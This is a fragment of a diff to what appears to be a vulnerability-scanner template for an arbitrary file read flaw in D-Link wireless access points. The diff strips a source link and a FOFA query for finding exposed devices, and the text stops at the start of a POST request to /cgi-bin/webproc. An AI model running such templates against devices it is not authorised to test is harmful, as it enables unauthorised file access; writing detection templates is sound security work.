@@ -3,12 +3,8 @@ info:
   name: D-link wireless系列产品存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xqrqsww4qicz6iie'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xqrqsww4qicz6iie
-    fofa: title="D-LINK SYSTEMS, INC. | WIRELESS AP | LOGIN"
 http:
 - raw:
   - 'POST /cgi-bin/webproc HTTP/1.1
